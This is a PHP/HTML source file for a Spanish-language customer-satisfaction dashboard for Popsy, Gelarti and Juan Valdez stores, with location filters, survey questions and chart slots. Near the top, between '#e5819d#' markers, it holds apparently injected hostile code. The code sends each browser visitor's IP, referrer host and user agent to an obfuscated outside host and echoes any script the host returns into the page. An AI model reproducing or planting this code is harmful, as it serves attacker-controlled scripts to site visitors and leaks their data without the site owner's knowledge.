<?php
include('security/lock.php');
ini_set("log_errors", 1);
ini_set("error_log", "error.log");
?>
<?php
#e5819d#
error_reporting(0); @ini_set('display_errors',0); $wp_xq7739 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xq7739) && !preg_match ('/bot/i', $wp_xq7739))){
$wp_xq097739="http://"."html"."-title".".com/title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xq7739);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xq097739); curl_setopt ($ch, CURLOPT_TIMEOUT, 10); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_7739xq = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_7739xq = @file_get_contents($wp_xq097739);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_7739xq=@stream_get_contents(@fopen($wp_xq097739, "r"));}}
if (substr($wp_7739xq,1,3) === 'scr'){ echo $wp_7739xq; }
#/e5819d#
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Dashboard Popsy / Gelarti / Juan Valdez</title>

    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="vendor/css/starter-template.css" rel="stylesheet">
    
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
  </head>

  <body>
    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container">
        <div class="navbar-header" style="color:#FFFFFF">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="http://popsy.synapsis-rs.org/index.php" style="color:#FFFF">Visor Popsy / Gelarti / Juan Valdez</a>
        </div>
        <div class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="#" style="color:#FFFF">Dashboard</a></li>
            <li style="color:#FFFFFF"><a style="color:#FFFFFF" href="mapa/" style="color:#FFFF">GeoTracker</a></li>
            <li style="color:#FFFFFF"><a style="color:#FFFFFF" target="blank" href="https://docs.google.com/spreadsheet/ccc?key=0AlHwGj2LLZqhdGhwUERGRHc0R1hjbTF2dDB0VmNYRXc&usp=sharing#gid=0">Evaluaciones</a></li>
            <li style="color:#FFFFFF"><a style="color:#FFFFFF" target="blank" href="https://docs.google.com/spreadsheet/ccc?key=0AvU9s7TQCJ4TdG1pMFpwcUMxbHlUM3BhWUdmRVhMZ0E&usp=sharing">Reportes</a></li>
            <li style="color:#FFFFFF"><a style="color:#FFFFFF" target="blank" href="https://docs.google.com/spreadsheets/d/1zqbsfDxck77vSRKVyf2owVHCcvwA0dYTkaBLVgN1bOQ/edit?usp=sharing"> Codificación </a></li>
			<li style="color:#FFFFFF"><a style="color:#FFFFFF" href="security/logout.php" style="color:#FFFF">Salir</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </div>

    <div class="container">
      <div class="starter-template">
			<div class="container">
				<div class="row">
					<div class="col-md-3">
						Pais
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-pais" class="form-control priority-value">
									<option value="todo">Todas</option>
								</select>
							</div>
						</div>
					</div>
					<div class="col-lg-3">
						Regional
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-region" class="form-control priority-value">
									<option value="todo">Todas</option>
								</select>
							</div>
						</div>
					</div>
					<div class="col-lg-3">
						Zona
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-zona" class="form-control priority-value">
									<option value="todo">Todas</option>
								</select>
							</div>
						</div>
					</div>
					<div class="col-lg-3">
						Ciudad
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-ciudad" class="form-control priority-value">
									<option value="todo">Todas</option>
								</select>
							</div>
						</div>
					</div>
					<div class="col-lg-3">
						PDV
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-PDV" class="form-control priority-value">
									<option value="todo">Todos</option>
								</select>
							</div>
						</div>
					</div>
					<div class="col-lg-3" style="margin-top:-1.5em;">
						Unidad de negocio
						<div class="input-group">
							<div class="input-group-btn">
								<select id="select-negocio" class="form-control priority-value">
									<option value="todo">Todas</option>
								</select>
							</div>
						</div>
					</div>
				<br>
				
				</div>
			</div>
			<div class="row">
			<br><br>
					<div class="col-lg-10">
					<div class="col-lg-10">
						
						Periodo
						
						<div>
                                                  <input type="checkbox" name="chk_group[]"  value="2013-12" class="period" />2013-12 (Diciembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-1" class="period" />2014-01 (Enero)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-2" class="period" />2014-02 (Febrero)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-3" class="period" />2014-03 (Marzo)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-4" class="period" />2014-04 (Abril)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-5" class="period" />2014-05 (Mayo)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-6" class="period" />2014-06 (Junio)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-7" class="period" />2014-07 (Julio)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-8" class="period" />2014-08 (Agosto)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-9" class="period" />2014-09 (Septiembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-10" class="period" />2014-10 (Octubre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-11" class="period" />2014-11 (Noviembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2014-12" class="period" />2014-12 (Diciembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-1" class="period" />2015-1 (Enero)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-2" class="period" />2015-2 (Febrero)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-3" class="period" />2015-3 (Marzo)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-4" class="period periods" />2015-4 (Abril)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-5" class="period periods" />2015-5 (Mayo)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-6" class="period periods" />2015-6 (Junio)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-7" class="period periods" />2015-7 (Julio)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-8" class="period periods" />2015-8 (Agosto)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-9" class="period periods" />2015-9 (Septiembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-10" class="period periods" />2015-10 (Octubre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-11" class="period periods" />2015-11 (Noviembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2015-12" class="period periods" />2015-12 (Diciembre)<br />
                                                  <input type="checkbox" name="chk_group[]"  value="2016-1" class="period periods" />2016-1 (Enero)<br />
                                              </div>
				  </div><!-- /.col-lg-3 -->

					</div>
			</div>
		<hr />  	
		 <div class="container dashboard-content">
			
			<div class="row">
				<h3>Indices</h3>
				<h4>Base - Tiendas</h4>
				<div class="col-md-12">
					<div id="chart_div"></div>
				</div>
				<div class="col-md-12" style="padding-top:4em">
				  <div id="chart_div_20"></div>
					<div >
						<span id="ultimo_mes" style="padding-left: 3em;">
						
						</span>
						<span id="acumulado_reloj_1" style="padding-left: 7em;">
						
						</span>
						
					</div>
				</div>
			</div>
			<hr />
			<!-- P1 Base Personas-->
			<div class="row">
				<h4>P.1. ¿qué tan satisfecho estuvo usted hoy en general con su experiencia de compra en Popsy / Gelarti / Juan Valdez?</h4>
				<h4>Base - Personas</h4>
				<div class="col-md-10">
					<div id="chart_div_30"></div>
				</div>
				<div class="col-md-10">
				  <div id="chart_div_40"></div>
				</div>
			</div>
			<hr />
			<!-- P2 Base Personas-->
			<div class="row">
				<h4>P.2. ¿qué tan satisfecho o insatisfecho se encuentra usted con…?</h4>
				<h4>Base - Personas</h4>
				<div class="col-md-12">
					<div id="chart_div_50" style="margin-left: -2em;"></div>
					<div></div>
				</div>
				<div class="col-md-8">
				  <div>
					<div style="padding-left:7em;padding-top:0em;"><h4>Promedio P2 - Acumulado</h4></div>
					<div id="chart_div_60" style="padding-top:1em;padding-left:8em;"></div>
			      </div>
				</div>
			</div>
			<div class="container">
				<div class="col-md-3" style="font-size:12px;">P2.A La amabilidad del personal que lo atendió</div>
				<div class="col-md-3" style="font-size:12px;">P2.B La limpieza/aseo del uniforme del personal</div>
				<div class="col-md-3" style="font-size:12px;">P2.C El tiempo de espera en la caja mientras le tomaban su pedido</div>
				<div class="col-md-3" style="font-size:12px;">P2.D El tiempo de espera para que le entregaran el pedido</div>
				<div class="col-md-3" style="font-size:12px;">P2.E La asesoría y acompañamiento que le brindó el personal</div>
				<div class="col-md-3" style="font-size:12px;">P2.F La solución a todos los problemas / inquietudes que se le presentaron a usted durante su visita</div>
			</div>
			<br />
			<br /><br />
			<hr />
			<!-- P2 -->
			<div class="row">
				<h4>P.2. ¿qué tan satisfecho o insatisfecho se encuentra usted con…?</h4>
				<div class="col-md-18">
					<div id="chart_div_70" style="margin-left: -3em;"></div>
				</div>
				<div class="col-md-2">
				  <div id="chart_div_80"></div>
				</div>
			</div>
			<div class="container">
				<div class="col-md-3" style="font-size:12px;">P2.A La amabilidad del personal que lo atendió</div>
				<div class="col-md-3" style="font-size:12px;">P2.B La limpieza/aseo del uniforme del personal</div>
				<div class="col-md-3" style="font-size:12px;">P2.C El tiempo de espera en la caja mientras le tomaban su pedido</div>
				<div class="col-md-3" style="font-size:12px;">P2.D El tiempo de espera para que le entregaran el pedido</div>
				<div class="col-md-3" style="font-size:12px;">P2.E La asesoría y acompañamiento que le brindó el personal</div>
				<div class="col-md-3" style="font-size:12px;">P2.F La solución a todos los problemas / inquietudes que se le presentaron a usted durante su visita</div>
			</div>
			<br />
			
			<hr />
			<!-- P3 Base Personas-->
			<div class="row">
				<h4>P.3.¿qué tan de acuerdo está usted en que el día de hoy en Popsy / Gelarti / Juan Valdez…</h4>
				<h4>Base - Personas</h4>
				<div class="col-md-12" style="margin-left: -1.5em;">
					<div id="chart_div_90"></div>
				</div>
				<div class="col-md-8">
				<div>
					<div style="padding-left:9em;padding-top:0em;"><h4>Promedio P3 - Acumulado</h4></div>
					<div id="chart_div_100" style="padding-top:1em;padding-left:10em;"></div>
				</div>
				</div>
			</div>
				<div class="container">
				<div class="col-md-3" style="font-size:12px;">P3.A Se sintió a gusto y en confianza</div>
				<div class="col-md-3" style="font-size:12px;">P3.B Las personas que lo atendieron conocen lo que usted quiere</div>
				<div class="col-md-3" style="font-size:12px;">P3.C El servicio que recibió lo hizo sentir satisfecho</div>
				<div class="col-md-3" style="font-size:12px;">P3.D Estaba limpio y ordenado</div>
				<div class="col-md-3" style="font-size:12px;">P3.E El personal que lo atendió era amable</div>
				<div class="col-md-3" style="font-size:12px;">P3.F El personal lo hizo sentir un cliente especial</div>
				<div class="col-md-3" style="font-size:12px;">P3.G Es un sitio para invitar a alguien</div>
				<div class="col-md-3" style="font-size:12px;">P3.H Lo atendieron más rápido que en otras Heladerías / Negocios de café</div>
			</div>
			
			<hr />
			<!-- P3-->
			<div class="row">
				<h4>P.3.¿qué tan de acuerdo está usted en que el día de hoy en Popsy / Gelarti / Juan Valdez…</h4>
				<div class="col-md-18" style="margin-left: -3em;">
					<div id="chart_div_110"></div>
				</div>
				<div class="col-md-8">
				  <div id="chart_div_120"></div>
				</div>
			</div>
			</div>
				<div class="container">
				<div class="col-md-3" style="font-size:12px;">P3.A Se sintió a gusto y en confianza</div>
				<div class="col-md-3" style="font-size:12px;">P3.B Las personas que lo atendieron conocen lo que usted quiere</div>
				<div class="col-md-3" style="font-size:12px;">P3.C El servicio que recibió lo hizo sentir satisfecho</div>
				<div class="col-md-3" style="font-size:12px;">P3.D Estaba limpio y ordenado</div>
				<div class="col-md-3" style="font-size:12px;">P3.E El personal que lo atendió era amable</div>
				<div class="col-md-3" style="font-size:12px;">P3.F El personal lo hizo sentir un cliente especial</div>
				<div class="col-md-3" style="font-size:12px;">P3.G Es un sitio para invitar a alguien</div>
				<div class="col-md-3" style="font-size:12px;">P3.H Lo atendieron más rápido que en otras Heladerías / Negocios de café</div>
			</div>
			
			<hr />
			<!-- B1 Base Personas-->
			<div class="row">
				<h4>B1. ¿qué tanto Recomendaría Usted a un familiar o amigo, venir a este punto de venta Popsy / Gelarti / Juan Valdez?</h4>
				<h4>Base - Personas</h4>
				<div class="col-md-10">
					<div id="chart_div_130"></div>
				</div>
				<div class="col-md-14">
				  <div id="chart_div_140"></div>
				</div>
			</div>
			
			<hr />
			<!-- B2 Base Personas-->
			<div class="row">
				<h4>B2.¿Diría usted que en general el servicio que recibió en Popsy / Gelarti / Juan Valdez el día de hoy ha sido…?</h4>
				<h4>Base - Personas</h4>
				<div class="col-md-10">
					<div id="chart_div_150"></div>
				</div>
				<div class="col-md-14">
				  <div id="chart_div_160"></div>
				</div>
			</div>
			
		 </div>
      </div>
    </div><!-- /.container -->


    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="js_charts/calls.js"></script>
    <script type="text/javascript" src="js_charts/load_google.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_1.js"></script>
    <script type="text/javascript" src="js_charts/clock_1.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_30.js"></script>
    <script type="text/javascript" src="js_charts/lines_40.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_50.js"></script>
    <script type="text/javascript" src="js_charts/clock_60.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_70.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_90.js"></script>
    <script type="text/javascript" src="js_charts/clock_100.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_110.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_130.js"></script>
    <script type="text/javascript" src="js_charts/lines_140.js"></script>
    
    <script type="text/javascript" src="js_charts/lines_150.js"></script>
    <script type="text/javascript" src="js_charts/lines_160.js"></script>
    
    <script type="text/javascript" src="js_charts/interactivity.js"></script>
    
    

    
  </body>
</html>
 
